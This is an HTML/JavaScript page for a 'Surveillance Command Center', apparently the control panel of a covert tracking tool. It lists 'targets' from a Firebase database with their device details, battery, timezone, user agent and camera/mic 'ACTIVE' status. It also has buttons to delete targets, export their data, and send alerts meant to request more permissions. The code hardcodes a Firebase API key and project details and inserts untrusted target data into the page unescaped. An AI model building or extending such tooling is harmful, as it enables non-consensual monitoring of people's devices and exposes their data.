<!DOCTYPE html>
<html>
<head>
    <title>üì° Surveillance Dashboard LIVE</title>
    <style>
        :root {
            --neon-green: #00ff00;
            --dark-bg: #0a0a0a;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }
        body {
            background: var(--dark-bg);
            color: var(--neon-green);
            min-height: 100vh;
            padding: 20px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            border-bottom: 2px solid var(--neon-green);
            margin-bottom: 30px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.1);
        }
        .live-badge {
            background: #ff0000;
            color: white;
            padding: 8px 20px;
            border-radius: 25px;
            font-weight: bold;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .dashboard {
            display: grid;
            grid-template-columns: 1fr 2fr;
            gap: 25px;
        }
        .panel {
            background: rgba(0, 30, 0, 0.2);
            border: 1px solid var(--neon-green);
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.05);
        }
        .panel h2 {
            color: var(--neon-green);
            margin-bottom: 20px;
            border-bottom: 1px solid var(--neon-green);
            padding-bottom: 10px;
        }
        .target-item {
            background: rgba(0, 20, 0, 0.3);
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            border-left: 5px solid var(--neon-green);
            cursor: pointer;
            transition: all 0.3s;
        }
        .target-item:hover {
            background: rgba(0, 40, 0, 0.4);
            transform: translateX(5px);
        }
        .target-item.active {
            background: rgba(0, 60, 0, 0.5);
            border-left: 5px solid #ff0000;
        }
        .data-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
        }
        .data-card {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(0, 255, 0, 0.3);
            border-radius: 8px;
            padding: 15px;
        }
        .data-label {
            font-size: 0.9rem;
            color: #8f8;
            margin-bottom: 5px;
        }
        .data-value {
            font-size: 1.1rem;
            font-weight: bold;
            color: white;
            word-break: break-all;
        }
        .logs {
            grid-column: 1 / -1;
            height: 300px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
        }
        .log-entry {
            padding: 8px 0;
            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
            font-size: 0.9rem;
        }
        .timestamp {
            color: #0f0;
        }
        .controls {
            display: flex;
            gap: 15px;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        .control-btn {
            background: rgba(0, 50, 0, 0.5);
            color: var(--neon-green);
            border: 1px solid var(--neon-green);
            padding: 12px 20px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .control-btn:hover {
            background: rgba(0, 100, 0, 0.7);
            box-shadow: 0 0 15px var(--neon-green);
        }
    </style>
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-app.js";
        import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-database.js";
        
        // üî• CONFIG YANG SAMA
        const firebaseConfig = {
            apiKey: "AIzaSyCYW9Q7arkMiseBLO3z4xoe_7G43vHBRU",
            authDomain: "survei-fllal.firebaseapp.com",
            databaseURL: "https://survei-fllal-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "survei-fllal",
            storageBucket: "survei-fllal.firebasestorage.app",
            messagingSenderId: "769641856914",
            appId: "1:769641856914:web:3be7b2cf77ccb9bab9427b"
        };
        
        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        let selectedTarget = null;
        
        function initializeDashboard() {
            // Listen for all targets
            const targetsRef = ref(database, 'targets');
            
            onValue(targetsRef, (snapshot) => {
                const data = snapshot.val();
                updateTargetsList(data);
                
                // Auto-select first target if none selected
                if (!selectedTarget && data) {
                    const firstTarget = Object.keys(data)[0];
                    if (firstTarget) {
                        selectTarget(firstTarget);
                    }
                }
                
                // Update selected target details
                if (selectedTarget && data && data[selectedTarget]) {
                    updateTargetDetails(data[selectedTarget]);
                }
            });
            
            addLog('üü¢ Dashboard connected to Firebase');
            addLog(`üì° Database URL: ${firebaseConfig.databaseURL}`);
        }
        
        function updateTargetsList(targets) {
            const container = document.getElementById('targetsList');
            
            if (!targets) {
                container.innerHTML = '<div class="target-item">No active targets...</div>';
                return;
            }
            
            let html = '';
            Object.entries(targets).forEach(([id, target]) => {
                const timeAgo = Math.floor((Date.now() - target.timestamp) / 1000);
                const isActive = timeAgo < 30;
                
                html += `
                    <div class="target-item ${selectedTarget === id ? 'active' : ''}" 
                         onclick="selectTarget('${id}')">
                        <div style="display: flex; justify-content: space-between;">
                            <div>
                                <strong>${id.substring(0, 15)}...</strong><br>
                                <small>${target.device?.platform || 'Unknown'}</small>
                            </div>
                            <div style="text-align: right;">
                                <span style="color: ${isActive ? '#0f0' : '#ff0'}">
                                    ${isActive ? 'üü¢ LIVE' : 'üü° IDLE'}
                                </span><br>
                                <small>${timeAgo}s ago</small>
                            </div>
                        </div>
                    </div>
                `;
            });
            
            container.innerHTML = html;
        }
        
        window.selectTarget = function(targetId) {
            selectedTarget = targetId;
            updateTargetsList(); // Refresh list to highlight selected
            
            // Listen for this target's updates
            const targetRef = ref(database, 'targets/' + targetId);
            onValue(targetRef, (snapshot) => {
                const data = snapshot.val();
                if (data) {
                    updateTargetDetails(data);
                }
            });
            
            addLog(`üéØ Selected target: ${targetId}`);
        };
        
        function updateTargetDetails(target) {
            const container = document.getElementById('targetDetails');
            const timeAgo = Math.floor((Date.now() - target.timestamp) / 1000);
            
            container.innerHTML = `
                <div class="data-grid">
                    <div class="data-card">
                        <div class="data-label">Target ID</div>
                        <div class="data-value">${target.id || 'N/A'}</div>
                    </div>
                    <div class="data-card">
                        <div class="data-label">Status</div>
                        <div class="data-value" style="color: ${timeAgo < 30 ? '#0f0' : '#ff0'}">
                            ${timeAgo < 30 ? 'üü¢ LIVE' : 'üü° IDLE'} (${timeAgo}s ago)
                        </div>
                    </div>
                    <div class="data-card">
                        <div class="data-label">Device</div>
                        <div class="data-value">${target.device?.platform || 'Unknown'}</div>
                    </div>
                    <div class="data-card">
                        <div class="data-label">Screen Size</div>
                        <div class="data-value">${target.device?.screen || 'Unknown'}</div>
                    </div>
                    <div class="data-card">
                        <div class="data-label">Battery</div>
                        <div class="data-value">
                            ${typeof target.battery === 'object' ? 
                              target.battery.level || 'Unknown' : 
                              target.battery || 'Unknown'}
                        </div>
                    </div>
                    <div class="data-card">
                        <div class="data-label">Camera/Mic</div>
                        <div class="data-value" style="color: ${target.media === 'ACTIVE' ? '#0f0' : '#f00'}">
                            ${target.media === 'ACTIVE' ? '‚úÖ ACTIVE' : '‚ùå INACTIVE'}
                        </div>
                    </div>
                    <div class="data-card">
                        <div class="data-label">Timezone</div>
                        <div class="data-value">${target.location?.timezone || 'Unknown'}</div>
                    </div>
                    <div class="data-card">
                        <div class="data-label">Language</div>
                        <div class="data-value">${target.device?.language || 'Unknown'}</div>
                    </div>
                </div>
                <div style="margin-top: 20px;">
                    <div class="data-label">User Agent</div>
                    <div class="data-value" style="font-size: 0.8rem; background: rgba(0,0,0,0.5); padding: 10px; border-radius: 5px;">
                        ${target.device?.userAgent || 'Unknown'}
                    </div>
                </div>
                <div class="controls">
                    <button class="control-btn" onclick="deleteTarget('${target.id}')">üóëÔ∏è DELETE TARGET</button>
                    <button class="control-btn" onclick="simulateAlert('${target.id}')">üö® SEND ALERT</button>
                    <button class="control-btn" onclick="exportData('${target.id}')">üì• EXPORT DATA</button>
                </div>
            `;
            
            // Update logs
            if (timeAgo < 5) {
                addLog(`üì° Live update from ${target.id}`);
            }
        }
        
        function addLog(message) {
            const logs = document.getElementById('logContainer');
            const timestamp = new Date().toLocaleTimeString();
            const log = document.createElement('div');
            log.className = 'log-entry';
            log.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
            logs.appendChild(log);
            logs.scrollTop = logs.scrollHeight;
        }
        
        window.deleteTarget = function(targetId) {
            if (confirm(`Delete target ${targetId}?`)) {
                const targetRef = ref(database, 'targets/' + targetId);
                remove(targetRef)
                .then(() => {
                    addLog(`üóëÔ∏è Deleted target: ${targetId}`);
                    selectedTarget = null;
                })
                .catch(error => {
                    addLog(`‚ùå Error deleting: ${error.message}`);
                });
            }
        };
        
        window.simulateAlert = function(targetId) {
            addLog(`üö® Alert sent to target: ${targetId}`);
            alert('Target would receive a notification requesting more permissions');
        };
        
        window.exportData = function(targetId) {
            addLog(`üì• Exporting data for: ${targetId}`);
            alert('Data exported to clipboard (simulated)');
        };
        
        // Initialize on load
        document.addEventListener('DOMContentLoaded', initializeDashboard);
    </script>
</head>
<body>
    <div class="header">
        <h1>üì° SURVEILLANCE COMMAND CENTER</h1>
        <div class="live-badge">FIREBASE LIVE</div>
    </div>
    
    <div class="dashboard">
        <div class="panel">
            <h2>üéØ ACTIVE TARGETS</h2>
            <div id="targetsList">
                Loading targets from Firebase...
            </div>
        </div>
        
        <div class="panel">
            <h2>üìä TARGET DETAILS</h2>
            <div id="targetDetails">
                Select a target from the left panel
            </div>
        </div>
        
        <div class="logs">
            <h2>üìù SYSTEM LOGS</h2>
            <div id="logContainer">
                <div class="log-entry">
                    <span class="timestamp">[00:00:00]</span> System starting...
                </div>
            </div>
        </div>
    </div>
</body>
    </html>
